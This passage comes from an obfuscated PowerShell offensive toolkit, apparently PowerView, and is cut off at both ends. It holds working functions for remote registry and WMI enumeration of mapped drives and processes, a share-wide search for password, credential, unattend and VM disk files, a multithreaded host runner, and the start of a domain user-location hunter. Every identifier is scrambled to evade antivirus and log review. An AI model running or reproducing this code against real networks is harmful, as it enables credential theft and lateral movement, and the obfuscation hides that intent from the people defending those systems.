                            ${P`R`OviDeRnaME} = ${r`eG}.("{3}{2}{4}{0}{1}" -f 'al','ue','n','GetStri','gV').Invoke(${H`Ku}, "$UserSID\Network\$DriveLetter", ("{0}{1}{2}{3}"-f 'Provider','Na','m','e'))."sV`A`Lue"
                            ${ReMOTe`p`A`TH} = ${R`eG}.("{3}{1}{2}{0}" -f'gValue','ri','n','GetSt').Invoke(${h`kU}, "$UserSID\Network\$DriveLetter", ("{2}{0}{1}"-f 'o','tePath','Rem'))."SVA`LUe"
                            ${dR`IV`E`UsERnAme} = ${r`eG}.("{1}{2}{0}{3}"-f'ri','Ge','tSt','ngValue').Invoke(${H`kU}, "$UserSID\Network\$DriveLetter", ("{1}{0}{2}"-f'serN','U','ame'))."sVal`UE"
                            if (-not ${us`eR`Name}) { ${USe`Rn`AmE} = '' }

                            if (${R`EmoTe`patH} -and (${r`Em`oTEp`Ath} -ne '')) {
                                ${mo`UN`TeDD`R`iVe} = &("{0}{2}{1}" -f'New','ect','-Obj') ("{0}{2}{1}"-f 'PSObj','t','ec')
                                ${m`ou`NteDD`RIVE} | &("{1}{0}{2}"-f'Me','Add-','mber') ("{3}{1}{0}{2}" -f'pr','e','operty','Not') ("{2}{3}{1}{0}"-f'Name','uter','Co','mp') ${C`OmpuT`er}
                                ${moU`NT`eD`dR`IVE} | &("{0}{1}{2}" -f 'Add','-Membe','r') ("{0}{2}{1}{3}" -f 'Not','ro','ep','perty') ("{2}{0}{1}" -f 'N','ame','User') ${uS`ern`AME}
                                ${MOUNte`DdR`i`Ve} | &("{2}{0}{1}" -f'd-Memb','er','Ad') ("{2}{0}{1}" -f'er','ty','Noteprop') ("{0}{1}" -f 'Use','rSID') ${us`Er`SiD}
                                ${MOUn`TEd`dR`IvE} | &("{0}{3}{1}{2}" -f 'A','e','mber','dd-M') ("{1}{3}{0}{2}"-f'er','Not','ty','eprop') ("{1}{2}{3}{0}"-f 'ter','D','rive','Let') ${dRIVE`l`ET`Ter}
                                ${mo`UntE`dDRi`VE} | &("{2}{1}{0}" -f'Member','d-','Ad') ("{1}{0}{2}" -f 'proper','Note','ty') ("{1}{2}{3}{0}"-f'me','P','rov','iderNa') ${P`RovidErna`ME}
                                ${MOUn`Te`D`Dri`Ve} | &("{1}{2}{3}{0}" -f'ber','A','dd-Me','m') ("{1}{3}{0}{2}" -f 'pro','Not','perty','e') ("{1}{0}{2}"-f 't','RemotePa','h') ${re`MOtE`PA`TH}
                                ${MoUnT`E`dDRiVE} | &("{3}{1}{0}{2}" -f'e','-Memb','r','Add') ("{2}{1}{0}"-f 'operty','epr','Not') ("{2}{1}{0}{3}" -f'erNa','riveUs','D','me') ${D`RIVE`U`SEr`NAme}
                                ${mo`Un`TEdD`RIVE}."psObJ`eCT"."T`YPeN`AmES".("{0}{1}" -f'Ins','ert').Invoke(0, ("{4}{0}{1}{5}{2}{3}" -f'Vi','ew','i','ve','Power','.RegMountedDr'))
                                ${mo`Un`TEddRi`Ve}
                            }
                        }
                    }
                    catch {
                        &("{4}{1}{0}{2}{3}" -f'e','t','-','Verbose','Wri') ('[G'+'et-WMIRegMou'+'nt'+'e'+'dD'+'rive] '+'E'+'rror: '+"$_")
                    }
                }
            }
            catch {
                &("{2}{3}{4}{0}{1}" -f 'n','g','Writ','e-Wa','rni') ('[Get-WMIR'+'e'+'gMountedD'+'ri'+'ve] '+'E'+'rro'+'r '+'ac'+'cess'+'ing '+"$Computer, "+'l'+'ike'+'ly '+'insuffi'+'c'+'ient'+' '+'per'+'mi'+'ssi'+'ons '+'or'+' '+'firewa'+'l'+'l '+'ru'+'le'+'s '+'on'+' '+'host:'+' '+"$_")
            }
        }
    }
}


function G`E`T-W`MIproc`ESS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f 'P','houldProcess','S','S'}, '')]
    [OutputType({"{1}{0}{3}{2}{4}{5}" -f 'rV','Powe','ew','i','.UserPro','cess'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitIoN = 0, VAlUEfroMpIpelInE = ${tR`Ue}, VaLUeFrOmpIPeLInEByProPeRtyName = ${tR`UE})]
        [Alias({"{2}{0}{1}" -f 'tN','ame','Hos'}, {"{2}{1}{0}{3}" -f 'am','shostn','dn','e'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cO`mput`ErN`Ame} = ("{0}{1}" -f'l','ocalhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`E`NtiAL} =   (  &("{1}{0}" -f'I','Gc')  ("{2}{1}{3}{0}" -f '0Vk','ArI','V','aBle:5R')  )."va`LUe"::"e`Mpty"
    )

    PROCESS {
        ForEach (${c`O`MpUt`ER} in ${c`O`Mp`UTERnAme}) {
            try {
                ${w`m`iaR`gUmENTs} = @{
                    ("{0}{2}{1}"-f 'C','me','omputerNa') = ${Com`P`UTe`Rna`ME}
                    ("{1}{0}"-f'ass','Cl') = ("{1}{2}{3}{0}" -f'ess','Win3','2_pr','oc')
                }
                if (${P`sBOUndpaR`Am`et`ers}[("{0}{2}{1}"-f 'Cr','ial','edent')]) { ${WmI`ARG`U`meN`Ts}[("{1}{0}{2}"-f 'edenti','Cr','al')] = ${CrEdeNT`i`AL} }
                &("{3}{1}{0}{2}"-f'MIo','-W','bject','Get') @WmiArguments | &("{1}{3}{0}{2}" -f'Each-Obje','F','ct','or') {
                    ${o`W`NEr} = ${_}.("{1}{2}{0}" -f 'wner','g','eto').Invoke();
                    ${Pro`c`ess} = &("{2}{1}{0}{3}" -f'Obje','ew-','N','ct') ("{1}{2}{0}"-f 't','PS','Objec')
                    ${P`RoCeSs} | &("{2}{0}{1}"-f 'dd-','Member','A') ("{3}{0}{1}{2}"-f'otep','ro','perty','N') ("{2}{3}{0}{1}" -f 'm','e','Compute','rNa') ${COM`PUt`er}
                    ${P`ROce`SS} | &("{0}{2}{1}" -f'Ad','r','d-Membe') ("{2}{0}{3}{1}"-f'prop','ty','Note','er') ("{2}{1}{0}" -f'me','sNa','Proces') ${_}."pRO`CeSs`NAme"
                    ${PR`oceSs} | &("{0}{2}{1}" -f'Add','ember','-M') ("{1}{0}{2}"-f 'roper','Notep','ty') ("{1}{0}{2}" -f'r','P','ocessID') ${_}."pr`o`CeSsID"
                    ${pR`Oc`ESs} | &("{2}{0}{1}" -f'dd-Membe','r','A') ("{3}{1}{0}{2}"-f'tepro','o','perty','N') ("{0}{1}"-f 'Do','main') ${O`w`NEr}."DO`ma`IN"
                    ${P`ROC`eSS} | &("{0}{3}{2}{1}"-f'Add-M','r','be','em') ("{0}{1}{2}{3}"-f 'N','otep','rop','erty') ("{0}{1}" -f'Us','er') ${O`W`NEr}."Us`eR"
                    ${P`Ro`CesS}."PsOB`J`EcT"."TyP`en`AMeS".("{0}{1}" -f'Inser','t').Invoke(0, ("{1}{3}{2}{0}" -f 'UserProcess','Po','ew.','werVi'))
                    ${P`R`OCeSS}
                }
            }
            catch {
                &("{1}{2}{3}{4}{0}"-f 'ose','W','rit','e','-Verb') ('[Get-'+'W'+'MIProcess'+']'+' '+'Erro'+'r '+'enum'+'e'+'r'+'ating '+'re'+'mote '+'proc'+'ess'+'es '+'o'+'n '+"'$Computer', "+'ac'+'c'+'ess '+'likel'+'y '+'de'+'nied:'+' '+"$_")
            }
        }
    }
}


function f`Ind-INTEr`estINgf`I`le {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{4}{1}" -f 'PSSh','s','dProc','oul','es'}, '')]
    [OutputType({"{5}{3}{1}{0}{2}{4}" -f'V','r','iew.Fo','owe','undFile','P'})]
    [CmdletBinding(dEFaULTpAraMeterSeTNamE = {"{1}{0}{4}{2}{3}" -f'le','Fi','ific','ation','Spec'})]
    Param(
        [Parameter(positIoN = 0, ValUeFromPIPELInE = ${tR`UE}, VAluEFroMPipeLinEBYProPertyNAMe = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`ATh} = '.\',

        [Parameter(pARAMetErSeTNAme = "fIL`eSPeCif`ICAt`iON")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'ms','Search','Ter'}, {"{0}{1}"-f'Te','rms'})]
        [String[]]
        ${inCLu`dE} = @(("{2}{1}{0}{3}"-f'or','w','*pass','d*'), ("{1}{2}{0}"-f've*','*','sensiti'), ("{0}{1}{2}"-f '*a','dmi','n*'), ("{0}{1}{2}"-f '*lo','g','in*'), ("{0}{1}{2}"-f '*se','cret','*'), ("{2}{0}{1}{3}" -f '*','.xm','unattend','l'), ("{1}{0}{2}" -f'd','*.vm','k'), ("{0}{1}" -f'*creds','*'), ("{3}{0}{2}{1}"-f'c','ntial*','rede','*'), ("{1}{2}{0}" -f'g','*.co','nfi')),

        [Parameter(PARaMetErSETNaMe = "F`IL`E`SPEC`iFiCaTIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${L`As`TaCCeSst`I`mE},

        [Parameter(paraMeTERSeTname = "f`IleS`Pec`iFiCaT`iOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${l`ASt`WrItEt`IME},

        [Parameter(pAraMEteRsETNAME = "FiLespec`I`FI`Ca`TiON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${C`REa`T`Iont`IMe},

        [Parameter(ParameteRSeTNAMe = "Of`F`IcED`OcS")]
        [Switch]
        ${OFf`icE`dOCS},

        [Parameter(pARameTeRSeTNaME = "frE`sH`e`Xes")]
        [Switch]
        ${FR`EShE`x`ES},

        [Parameter(PaRAmEtERseTnamE = "FilesP`ec`iF`iCAT`i`ON")]
        [Switch]
        ${e`XCLudef`OL`DE`RS},

        [Parameter(ParAMEtERSeTnaMe = "FI`lEsP`ECIfIcAT`iOn")]
        [Switch]
        ${E`XclUDEH`IDDEN},

        [Switch]
        ${Ch`E`CkwRi`TeACce`sS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`edeNti`Al} =   (  &("{1}{0}"-f 'CI','G')  ("{3}{2}{1}{0}"-f '5R0VK','aBLe:','i','var') )."VA`LuE"::"em`PtY"
    )

    BEGIN {
        ${SeaR`ch`er`ArgU`MEn`TS} =  @{
            ("{0}{1}{2}" -f 'R','ec','urse') = ${T`Rue}
            ("{2}{0}{1}" -f'rorActio','n','Er') = ("{2}{3}{0}{1}"-f 't','inue','Sile','ntlyCon')
            ("{0}{2}{1}"-f 'Inclu','e','d') = ${I`Nc`lude}
        }
        if (${PsBouNd`p`A`RAMe`TeRS}[("{0}{3}{1}{2}" -f 'Off','Do','cs','ice')]) {
            ${Se`A`Rc`hErarGumE`Nts}[("{0}{1}" -f 'In','clude')] = @(("{1}{0}"-f '.doc','*'), ("{1}{0}"-f'docx','*.'), ("{0}{1}"-f '*.xl','s'), ("{0}{1}" -f'*.x','lsx'), ("{1}{0}"-f 'ppt','*.'), ("{1}{0}" -f'tx','*.pp'))
        }
        elseif (${pSB`OU`NdP`ARAMe`Te`Rs}[("{0}{3}{2}{1}" -f'Fre','XEs','hE','s')]) {
            
            ${L`AStACcESSt`IMe} = (&("{0}{1}" -f 'G','et-Date')).("{2}{0}{1}"-f'ddDa','ys','A').Invoke(-7).("{0}{1}" -f 'ToStrin','g').Invoke(("{0}{1}{2}" -f'M','M/dd/y','yyy'))
            ${SEARCHeraR`GUM`en`TS}[("{0}{1}{2}" -f'I','nclud','e')] = @(("{1}{0}" -f'xe','*.e'))
        }
        ${S`earCHe`RAr`gum`EnTS}[("{0}{1}" -f'For','ce')] = -not ${pS`BOUN`dPa`RAM`EtE`Rs}[("{3}{2}{1}{0}"-f'n','dde','Hi','Exclude')]

        ${Ma`P`pedCOm`put`eRs} = @{}

        function T`ES`T-`WrIte {
            
            [CmdletBinding()]Param([String]${P`ATh})
            try {
                ${fi`lEt`ESt} =  (&("{1}{2}{0}{3}"-f '-varIAbL','Ge','t','E')  ("9"+"rjY") -vaLUeo )::("{2}{1}{0}"-f 'ite','penWr','O').Invoke(${p`ATH})
                ${F`I`leteSt}.("{0}{1}"-f 'Cl','ose').Invoke()
                ${tr`Ue}
            }
            catch {
                ${f`Al`se}
            }
        }
    }

    PROCESS {
        ForEach (${tA`RgE`Tp`Ath} in ${P`ATh}) {
            if ((${Ta`RGeTP`AtH} -Match ((("{3}{2}{4}{1}{0}"-f 'l.*','.*ZOlZO','l','ZOlZO','ZOlZOl'))  -CrePlAcE  'ZOl',[cHAR]92)) -and (${psB`oU`N`d`pA`RamETERS}[("{0}{2}{1}" -f 'Cre','l','dentia')])) {
                ${H`oStc`Ompu`T`Er} = (&("{1}{2}{0}{3}"-f 'b','New-','O','ject') ("{0}{2}{1}"-f'Sy','Uri','stem.')(${taR`G`e`TPath}))."h`OST"
                if (-not ${M`Ap`PED`COMPut`eRS}[${Hostc`Ompu`TEr}]) {
                    
                    &("{0}{4}{2}{1}{3}" -f'A','nn','moteCo','ection','dd-Re') -ComputerName ${Ho`s`TcomPut`Er} -Credential ${Cred`E`NtiaL}
                    ${MAPpEDcOmp`U`TE`Rs}[${H`osT`cO`mP`UTER}] = ${tR`UE}
                }
            }

            ${sea`RChe`RA`RgUME`Nts}[("{0}{1}"-f'Pa','th')] = ${taRGeT`p`ATH}
            &("{0}{1}{2}"-f 'Get-','ChildIte','m') @SearcherArguments | &("{2}{3}{0}{1}" -f'h-O','bject','F','orEac') {
                
                ${conT`iNue} = ${tR`UE}
                if (${pSB`OUN`dPAr`AME`TeRS}[("{4}{1}{0}{3}{2}" -f'F','e','lders','o','Exclud')] -and (${_}."ps`iS`cOnt`Ai`NEr")) {
                    &("{0}{1}{2}{3}" -f 'W','ri','te-Verbo','se') "Excluding: $($_.FullName) "
                    ${CO`NTiN`Ue} = ${F`A`lse}
                }
                if (${L`AStACcEsS`TiMe} -and (${_}."lAsta`C`Ce`ssTi`Me" -lt ${L`AsTac`cesSt`ime})) {
                    ${CO`N`TiNUe} = ${f`ALSE}
                }
                if (${p`Sb`OUndp`AR`AmEterS}[("{1}{0}{2}"-f 'astWrit','L','eTime')] -and (${_}."lAStW`RItE`TIMe" -lt ${LaSt`wRi`Te`TI`me})) {
                    ${CoNt`i`NUe} = ${F`AlSe}
                }
                if (${psb`o`UNDPaRaM`eTe`RS}[("{3}{2}{0}{1}" -f 'ionTim','e','reat','C')] -and (${_}."C`RE`ATI`oNtImE" -lt ${CreA`TiONT`i`ME})) {
                    ${c`O`NtiNuE} = ${fal`SE}
                }
                if (${P`sBOuNd`Par`Ame`TErs}[("{0}{1}{3}{2}{4}"-f 'C','hec','eAcces','kWrit','s')] -and (-not (&("{1}{0}{2}" -f 't-W','Tes','rite') -Path ${_}."FUL`lName"))) {
                    ${ConT`iN`UE} = ${FaL`Se}
                }
                if (${COnT`INUE}) {
                    ${fIlE`PaR`A`ms} = @{
                        ("{0}{1}"-f 'Pat','h') = ${_}."fUl`ln`AME"
                        ("{1}{0}"-f 'er','Own') = $((&("{0}{2}{1}"-f'G','-Acl','et') ${_}."ful`lnA`Me")."O`wNeR")
                        ("{1}{0}{3}{4}{2}"-f'st','La','ime','Acc','essT') = ${_}."lA`sT`Acces`sTiME"
                        ("{0}{3}{2}{4}{1}" -f 'La','ime','Writ','st','eT') = ${_}."LAs`TW`R`iTe`TIme"
                        ("{1}{2}{0}{3}" -f 'ti','Cr','ea','onTime') = ${_}."CREa`TioNt`IME"
                        ("{2}{1}{0}"-f'gth','n','Le') = ${_}."lEn`GtH"
                    }
                    ${f`O`Un`dfilE} = &("{2}{0}{3}{1}"-f 'w-Obj','ct','Ne','e') -TypeName ("{0}{1}{2}"-f 'P','SOb','ject') -Property ${F`ILEP`Ar`Ams}
                    ${fOu`Ndf`ilE}."Ps`Obje`CT"."tYp`enA`MES".("{1}{0}"-f'ert','Ins').Invoke(0, ("{3}{2}{5}{4}{1}{0}" -f'dFile','View.Foun','w','Po','r','e'))
                    ${fo`UnDFi`LE}
                }
            }
        }
    }

    END {
        
        ${mapPED`cOMP`U`Ters}."kE`Ys" | &("{0}{3}{5}{1}{4}{2}"-f 'R','on','ction','emove-Remo','ne','teC')
    }
}








function NEW-tH`REaDedfU`NC`TIOn {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{5}{2}{6}{8}{9}{4}{7}" -f 'seS','ho','t','PSU','i','uldProcessForSta','eChangingF','ons','u','nct'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(poSITIon = 0, MANdatoRy = ${Tr`UE}, vaLUEfRompIPeliNE = ${Tr`UE}, vAlueFrOmPipELInebYPRoPERtyNaME = ${tR`UE})]
        [String[]]
        ${C`omP`UT`eRNaME},

        [Parameter(pOSITIOn = 1, MANdAtoRy = ${T`RUe})]
        [System.Management.Automation.ScriptBlock]
        ${SCripTB`l`O`cK},

        [Parameter(posITion = 2)]
        [Hashtable]
        ${s`Cr`iPtPa`RamEteRs},

        [Int]
        [ValidateRange(1,  100)]
        ${t`hr`EaDs} = 20,

        [Switch]
        ${NoI`MpOR`TS}
    )

    BEGIN {
        
        
        ${s`ESSION`StaTE} =  ( &("{2}{0}{1}"-f'LD','ItEm','cHI') ('vARiAbL'+'E'+':4CkI'+'p7') )."vaL`Ue"::("{2}{0}{1}" -f'ateDe','fault','Cre').Invoke()

        
        
        ${SessIoN`s`TATE}."APa`Rtme`NTstA`TE" =   ${1`Tzd}::"S`Ta"

        
        
        if (-not ${Noimp`o`RTS}) {
            
            ${M`yVA`RS} = &("{2}{1}{0}{3}"-f'ariab','et-V','G','le') -Scope 2

            
            ${VO`R`BiDDE`NvA`RS} = @('?',("{0}{1}"-f'a','rgs'),("{0}{4}{1}{3}{2}" -f 'Con','o','e','leFileNam','s'),("{0}{1}"-f 'Err','or'),("{1}{2}{3}{0}" -f'xt','Ex','ecu','tionConte'),("{1}{0}" -f'e','fals'),("{1}{0}"-f'E','HOM'),("{1}{0}" -f 'ost','H'),("{0}{1}" -f'i','nput'),("{1}{3}{0}{2}"-f 'Obj','Inp','ect','ut'),("{1}{0}{2}{3}" -f 'mA','Maximu','lias','Count'),("{3}{0}{1}{5}{4}{2}"-f'ximum','Dri','nt','Ma','Cou','ve'),("{2}{1}{4}{3}{0}"-f 'nt','ximumErro','Ma','ou','rC'),("{0}{5}{4}{1}{2}{3}" -f'M','i','mumFunctionCou','nt','x','a'),("{3}{2}{5}{4}{0}{1}"-f 'to','ryCount','axi','M','umHis','m'),("{4}{0}{3}{2}{5}{6}{1}"-f'im','t','V','um','Max','a','riableCoun'),("{1}{0}{2}"-f 'ca','MyInvo','tion'),("{1}{0}" -f'll','nu'),'PID',("{1}{3}{0}{2}"-f'Parameter','PSBoun','s','d'),("{1}{3}{2}{0}"-f'ath','P','CommandP','S'),("{0}{2}{1}"-f 'PSC','e','ultur'),("{1}{4}{0}{6}{3}{7}{5}{2}" -f 'ault','PSDe','s','Val','f','e','Parameter','u'),("{0}{1}"-f'PSHOM','E'),("{2}{1}{0}" -f'iptRoot','SScr','P'),("{3}{0}{1}{2}"-f 'IC','ultur','e','PSU'),("{0}{1}{2}{3}" -f 'PSVersi','o','nTabl','e'),'PWD',("{0}{1}" -f'Shell','Id'),("{1}{5}{3}{2}{4}{0}"-f 'dHash','Sy','hron','c','ize','n'),("{1}{0}"-f'e','tru'))

            
            ForEach (${V`Ar} in ${MYvA`RS}) {
                if (${vO`R`BiDdeNVArs} -NotContains ${v`AR}."n`Ame") {
                ${Se`SSioN`sT`ATE}."v`ArI`AbleS".("{0}{1}" -f 'Ad','d').Invoke((&("{0}{2}{1}"-f'New-Obj','ct','e') -TypeName ("{14}{1}{7}{10}{16}{3}{5}{8}{12}{15}{17}{2}{11}{9}{0}{6}{4}{13}{18}"-f 'ateVar','gement.','io','on.R','b','uns','ia','A','pac','St','utoma','n','es.S','le','System.Mana','e','ti','ss','Entry') -ArgumentList ${v`AR}."n`AME",${V`AR}."va`LUE",${V`Ar}."d`eSCRIpT`ion",${v`AR}."oPt`IOns",${V`AR}."a`TtR`IBu`TeS"))
                }
            }

            
            ForEach (${fU`NcTi`oN} in (&("{3}{2}{1}{0}" -f 'm','dIte','Chil','Get-') ("{1}{3}{2}{0}"-f ':','Fu','tion','nc'))) {
                ${sE`ssi`OnSTa`Te}."Com`MAnds".("{0}{1}" -f 'Ad','d').Invoke((&("{2}{0}{1}" -f'w','-Object','Ne') -TypeName ("{12}{4}{1}{10}{2}{3}{9}{6}{0}{11}{5}{8}{7}"-f'o','tem.Management','Automati','o','ys','StateFunc','ces.Sessi','onEntry','ti','n.Runspa','.','n','S') -ArgumentList ${FU`NCT`Ion}."N`Ame", ${Fun`Ct`iOn}."DeFiNi`TI`on"))
            }
        }

        
        
        

        
        ${p`Ool} =   ${LTH`sf}::("{1}{5}{3}{4}{2}{0}"-f 'ool','Crea','eP','e','Runspac','t').Invoke(1, ${t`HRe`AdS}, ${s`eSsIo`NStaTE}, ${h`Ost})
        ${po`oL}.("{1}{0}"-f 'en','Op').Invoke()

        
        ${M`ETHOd} = ${n`ULL}
        ForEach (${M} in   (&("{0}{2}{1}" -f 'gEt-V','RIAbLE','a') ('9c'+'q')  )."val`UE".("{1}{0}{2}" -f'e','GetM','thods').Invoke() | &("{1}{2}{0}{3}"-f'e','Where-','Obj','ct') { ${_}."Na`mE" -eq ("{2}{1}{0}"-f 'oke','Inv','Begin') }) {
            ${MetH`Od`parame`TE`Rs} = ${m}.("{0}{3}{2}{1}" -f'G','rs','e','etParamet').Invoke()
            if ((${Met`h`oD`ParAMe`TE`Rs}."CO`UNt" -eq 2) -and ${methOdP`A`Ra`m`E`TerS}[0]."n`AME" -eq ("{1}{0}" -f'put','in') -and ${ME`THOdpArAm`Ete`RS}[1]."Na`me" -eq ("{0}{1}" -f 'o','utput')) {
                ${MeTH`Od} = ${M}."mak`EGEnErICME`T`HOD"([Object], [Object])
                break
            }
        }

        ${j`oBs} = @()
        ${co`mpUte`R`NAmE} = ${CoMpUT`e`RnAme} | &("{1}{2}{0}{3}" -f'j','Where','-Ob','ect') {${_} -and ${_}.("{0}{1}"-f'T','rim').Invoke()}
        &("{0}{3}{1}{2}{4}" -f'W','e-Ve','rbo','rit','se') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${TH`Re`AdS} -ge ${coM`pUtErN`A`me}."l`eng`TH") {
            ${tHRE`A`ds} = ${COm`pUter`N`A`me}."l`eNgTH"
        }
        ${ELEM`ENts`p`L`I`Tsize} = [Int](${C`o`MpuTERn`AME}."Le`NGth"/${thRE`Ads})
        ${C`OMPuteR`NAme`pArtIt`IoNEd} = @()
        ${s`TA`RT} = 0
        ${e`Nd} = ${ElE`mEnTSPl`iTs`IzE}

        for(${i} = 1; ${I} -le ${TH`Rea`DS}; ${i}++) {
            ${L`iSt} = &("{0}{2}{1}" -f 'New-','bject','O') ("{0}{2}{6}{7}{5}{1}{3}{4}"-f'S','s.Arra','y','yLis','t','on','ste','m.Collecti')
            if (${i} -eq ${t`HR`eADs}) {
                ${e`Nd} = ${CO`MputEr`N`A`ME}."Le`NgtH"
            }
            ${li`sT}."AD`draNGe"(${c`Omp`UT`ERnA`Me}[${St`A`RT}..(${e`Nd}-1)])
            ${STa`Rt} += ${E`L`emE`NTSPlIt`SiZE}
            ${E`Nd} += ${ElEme`N`TSPLit`si`ze}
            ${co`mpU`T`E`RNAM`EPARTitI`oN`eD} += @(,@(${LI`sT}.("{1}{0}"-f'rray','ToA').Invoke()))
        }

        &("{1}{3}{0}{2}" -f'rb','W','ose','rite-Ve') ('[New-T'+'hr'+'ead'+'ed'+'F'+'unct'+'ion] '+'Tota'+'l '+'n'+'umber'+' '+'o'+'f '+'th'+'reads/part'+'ition'+'s: '+"$Threads")

        ForEach (${ComPuter`NAmE`pA`R`T`ITiON} in ${cOmp`UTe`RNAmePAr`T`i`Ti`oNED}) {
            
            ${pO`WEr`SHe`ll} =  ( &("{1}{2}{0}" -f 'abLE','gET','-VARI')  ("9"+"cQ") )."vA`Lue"::("{0}{1}" -f'Cre','ate').Invoke()
            ${PO`wE`RSheLL}."Ru`NsP`AcEpO`ol" = ${P`OoL}

            
            ${NU`Ll} = ${pO`WEr`shE`ll}.("{0}{2}{1}" -f'AddSc','ipt','r').Invoke(${ScR`IPT`BL`oCK}).("{2}{0}{1}{3}"-f 'd','dPara','A','meter').Invoke(("{0}{2}{1}{3}" -f 'Co','Nam','mputer','e'), ${c`OmPu`TE`RNaMepar`Ti`T`iON})
            if (${sC`RIP`TpaRA`mETers}) {
                ForEach (${PA`RAm} in ${ScR`iptP`A`RAMeT`erS}.("{2}{1}{0}" -f'numerator','E','Get').Invoke()) {
                    ${N`UlL} = ${Po`WEr`S`HeLl}.("{0}{1}{2}{3}" -f'AddP','ar','amete','r').Invoke(${P`AR`Am}."N`AmE", ${pAr`Am}."v`AlUe")
                }
            }

            
            ${o`U`TpUt} = &("{1}{0}{3}{2}" -f 'ew-','N','ect','Obj') ("{10}{0}{8}{3}{9}{2}{1}{5}{6}{4}{7}"-f 'na','e','Coll','t.Automat','Ob','cti','on[','ject]','gemen','ion.PSData','Ma')

            
            ${Jo`BS} += @{
                ('PS') = ${P`owErShE`LL}
                ("{0}{1}"-f'Out','put') = ${oU`T`Put}
                ("{0}{1}"-f 'R','esult') = ${m`Et`hOd}."i`NVo`Ke"(${PoWE`Rs`HElL}, @(${n`UlL}, [Management.Automation.PSDataCollection[Object]]${o`U`TPuT}))
            }
        }
    }

    END {
        &("{1}{3}{2}{0}"-f 'se','Wr','bo','ite-Ver') ("{9}{8}{6}{2}{7}{0}{5}{1}{4}{3}"-f 'F','on]','hr','uting',' Threads exec','uncti','T','eaded','ew-','[N')

        
        Do {
            ForEach (${j`oB} in ${jO`Bs}) {
                ${j`oB}."oUtp`UT".("{0}{1}" -f'ReadAl','l').Invoke()
            }
            &("{1}{0}{2}{3}" -f't-Sl','Star','ee','p') -Seconds 1
        }
        While ((${JO`Bs} | &("{2}{3}{1}{0}"-f 't','ec','Wher','e-Obj') { -not ${_}."r`Es`ULT"."IScO`m`pL`ETed" })."COU`Nt" -gt 0)

        ${SLeE`pseCO`Nds} = 100
        &("{4}{3}{2}{0}{1}"-f'r','bose','-Ve','e','Writ') ('['+'N'+'ew-Threaded'+'F'+'u'+'ncti'+'on'+'] '+'Wait'+'ing'+' '+"$SleepSeconds "+'s'+'econd'+'s '+'fo'+'r '+'fi'+'nal '+'c'+'lean'+'up'+'...')

        
        for (${I}=0; ${I} -lt ${Sl`EEpSECon`ds}; ${I}++) {
            ForEach (${J`ob} in ${j`obs}) {
                ${j`ob}."O`UT`PUT".("{0}{2}{1}"-f'Re','All','ad').Invoke()
                ${J`ob}."Ps".("{0}{2}{1}"-f'D','e','ispos').Invoke()
            }
            &("{1}{2}{0}" -f '-Sleep','S','tart') -S 1
        }

        ${P`ooL}.("{0}{1}{2}"-f'Disp','o','se').Invoke()
        &("{0}{1}{4}{3}{2}"-f'Write','-Ver','se','o','b') ("{3}{1}{4}{8}{10}{9}{7}{0}{5}{11}{6}{2}"-f'] all thre','ew-ThreadedF','ed','[N','u','ads com','t','on','n','ti','c','ple')
    }
}


function FIN`D`-DO`M`AIN`U`Se`RlOcAtioN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{0}{1}" -f'd','Process','oul','P','SSh'}, '')]
    [OutputType({"{6}{0}{3}{2}{1}{4}{5}"-f 'owerView.Us','c','rLo','e','ati','on','P'})]
    [CmdletBinding(DefaUlTPaRaMeTErseTNaME = {"{4}{3}{0}{2}{1}"-f 'erGroupI','ity','dent','s','U'})]
    Param(
        [Parameter(POSITiOn = 0, VaLUefrOmPIpeliNE = ${tR`UE}, vaLUefroMpIPelinEByPropERtYNamE = ${Tr`Ue})]
        [Alias({"{2}{1}{3}{0}" -f 'Name','S','DN','Host'})]
        [String[]]
        ${C`OmpuTE`R`NAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMPu`TEr`do`MAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${co`mPUTer`ldA`pfILteR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OMP`Uter`SEArcHB`AsE},

        [Alias({"{1}{0}{2}{3}"-f 'o','Unc','ns','trained'})]
        [Switch]
        ${Co`mpUtE`RUNCo`NST`RAiNEd},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{3}{0}{2}" -f'y','perati','stem','ngS','O'})]
        [String]
        ${cOmPuTE`Rope`RAtiN`gSySt`Em},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'k','rvicePac','Se'})]
        [String]
        ${CO`MpUTer`SeR`V`I`cEpAcK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'SiteNam','e'})]
        [String]
        ${cOMpu`T`ErSit`en`A`Me},

        [Parameter(parametERSEtnAme = "USErI`DE`NT`ITY")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${use`RIDEn`TitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${UsE`RD`Om`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USeRl`D`ApFIL`TEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`er`sea`R`cHBaSe},

        [Parameter(PARAmetERSEtNAmE = "u`SeRG`RoU`pidEntITY")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'e','Gr','oupNam'}, {"{0}{1}"-f 'G','roup'})]
        [String[]]
